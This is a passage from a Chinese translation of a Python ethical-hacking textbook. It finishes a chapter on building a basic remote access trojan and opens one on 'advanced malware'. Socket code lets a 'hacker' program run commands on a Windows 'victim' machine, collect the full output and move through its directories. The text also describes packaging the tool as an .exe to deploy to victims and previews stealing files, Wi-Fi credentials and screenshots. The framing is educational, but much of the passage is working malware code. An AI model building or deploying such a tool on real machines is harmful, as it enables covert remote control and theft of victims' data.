

现在，使用你的黑客程序运行相同的命令。你的输出将如下所示：

![](img/d31345bbfd15f63be2920f0de5fa30dc_147_0.png)

图 6.9 – 被截断的命令结果

正如你所见，我们只能接收 1,024 字节。这不是我们想要的。为了获取完整的结果，我们需要做一些修改。在受害者程序上，我们将在 command_result 的末尾附加一个特殊标识符。使用此标识符，我们将在黑客程序中继续读取数据，直到到达该标识符。这将作为黑客程序的标记，知道我们已完成接收所有数据并且可以停止。

标识符字符串如下：

```
IDENTIFIER = "<END_OF_COMMAND_RESULT>"
```

要将此标识符添加到 command_result，我们将首先将结果从字节解码为字符串，然后在末尾附加标识符，最后再次将字符串转换为字节，如下所示：

```
command_result = output.stdout
command_result = command_result.decode("utf-8") + IDENTIFIER
command_result = command_result.encode("utf-8")
```

这次，我们将不再使用 send() 方法，而是使用 sendall() 方法。

在黑客端，我们将定义完全相同的标识符，以便我们可以匹配它。现在，我们将不再只是接收 1,024 字节，而是添加一个 while 循环，该循环将持续接收数据并将其存储在数组中，直到找到标识符，然后我们将删除标识符并存储剩余的结果。

请看以下接收代码：

```
full_command_result = b""
while True:
    chunk = hacker_socket.recv(1048)
    if chunk.endswith(IDENTIFIER.encode()):
        chunk = chunk[:-len(IDENTIFIER)]
        full_command_result += chunk
        break
    full_command_result +=chunk
print(full_command_result.decode())
```

我们定义了一个 full_command_result 变量来保存完整的结果。然后我们编写一个循环来持续读取缓冲区，直到到达标识符。一旦到达标识符，我们将从结果中删除标识符，将剩余的字节添加到 full_command_result 中，跳出循环，最后将其解码以打印。黑客的完整程序如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py。

同样，受害者的完整程序如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。

现在我们已经开发了一个黑客程序，它将在 Windows 受害者机器上执行命令并将完整结果返回给黑客。该程序将完美运行。然而，由于我们仅处理命令结果的输入和输出，因此更改目录的命令在此处将无法正常工作。接下来，我们将专注于制作一个程序，以便我们也可以导航目录。如果你去你的 Windows 机器并打开命令提示符，你可以使用 cd 命令来导航目录，我们在这里也会使用类似的方法。因此，当用户输入更改目录命令时，我们将根据给定的命令在受害者机器上移动到不同的目录。在本节中，我们学习了如何从黑客程序运行命令并将结果返回给黑客。在下一节中，我们将学习如何通过从黑客程序发出命令来在受害者计算机上导航目录。

## 导航目录

我们将使用一个新的模块来更改目录，称为 os 模块。该模块包含在 Python 的标准库中，因此你无需安装它。只需在程序中通过编写以下命令导入该模块即可：

```
import os
```

我们需要做的第一件事是检测用户在黑客程序中输入 cd 命令时。在字符串 command 上调用 startswith() 方法可以实现这一点。我们将检测命令，将命令发送到受害者程序，然后跳过循环的其余部分，如下所示：

```
if command.startswith("cd"):
    hacker_socket.send(command.encode())
    continue
```

我们程序的第一部分现在已完成。接下来，我们需要在受害者程序上接收此命令，对其进行解码，检查命令类型，例如导航目录，然后找到我们想要移动到的路径。假设如果我们想在目录中后退（在层次结构中向上一步），我们输入以下命令：

```
cd ..
```

cd 是命令的名称，.. 是我们想要移动到的路径。因此，在受害者程序上，我们将首先使用相同的检查条件来查看 hacker_command 是否以 cd 开头。如果是，我们将剥离命令以检索我们想要进入的路径。最后，我们将使用 os.chdir() 方法导航到输入的目录（如果存在）：

```
if hacker_command.startswith("cd"):
    path2move = hacker_command.strip("cd ")
    if os.path.exists(path2move):
        os.chdir(path2move)
    else:
        print("can't change directory to ", path2move)
    continue
```

在 Windows 中，你可以通过在 shell 中输入 pwd（当前工作目录）命令来查看当前目录。现在让我们运行黑客和受害者程序，看看我们如何导航目录：

![](img/d31345bbfd15f63be2920f0de5fa30dc_150_0.png)

图 6.10 – 更改目录

正如前面的屏幕截图所示，我们首先使用 cd .. 命令在文件夹中向上导航并移动到用户文件夹。然后，我们通过 cd Desktop 命令导航到桌面文件夹。这样，我们就可以在文件系统中向上或向下移动。黑客程序的完整代码如下：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py。

同样，受害者程序的完整代码如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。

前面的程序将允许黑客执行命令并将受害者 PC 的基本控制权交给黑客。黑客可以使用它作为模板为程序构建更高级的功能。你可能会想，我们到目前为止编写的所有代码都是 Python 脚本的形式，为了部署它并进行成功的黑客攻击，受害者 PC 必须安装 Python 并且脚本必须手动运行，这似乎不是一个好主意。别担心。在第 8 章《后利用》中，我们将研究如何将我们的 Python 代码打包成一个包含所有依赖项的单个可执行文件。这样，我们就不必担心受害者是否安装了 Python。我们将从脚本创建 .exe 文件并将其部署到受害者。有关更多信息，请参阅下一章。

## 总结

在本章中，我们首先学习了套接字编程，然后学习了如何使用套接字创建网络应用程序。我们的网络应用程序包括黑客和受害者程序，这有助于我们从基于 Linux 的黑客程序发送 Windows 系统命令，在 Windows 上执行它们，并将结果返回给黑客。我们还学习了如何导航文件流。我们的 RAT 基础版本已完成。尽管其功能有限，但它为我们提供了创建更高级的恶意软件程序的基础知识的坚实理解。在下一章中，我们将为我们的 RAT 添加更多功能，例如传输文件。下一章见！

## 7
高级恶意软件

在上一章中，我们学习了如何创建一个非常简单的恶意软件，它执行由黑客发送的 *Windows* 命令并返回这些命令的结果。该程序在仅执行命令的能力方面非常有限。理想情况下，对于 **远程访问工具**，我们希望恶意软件程序具有比这更高级的功能。本章将给你一个关于你可以在恶意软件程序中编写的更高级功能的基本概念。我们将在本章中介绍以下主题：

- 文件传输
- 窃取 Wi-Fi 凭据
- 截屏

## 构建一个 keylogger 文件传输

我们已经在第 6 章《恶意软件开发》中开发的程序中学习了如何发送和接收非常基本的数据。在本章中，我们将尝试从一台 PC 向另一台 PC 发送和接收文件，首先从受害者 PC 向黑客 PC，然后从黑客 PC 向受害者 PC。这将使我们能够访问受害者 PC 上存在的任何敏感文件。例如，假设受害者已将其密码存储在其 PC 上存在的文件中（这是一个非常糟糕的主意；切勿将密码以纯文本文件形式存储在你的 PC 上）；那么我们可以简单地读取文件的内容并将其发送给黑客。让我们看看这是如何工作的。

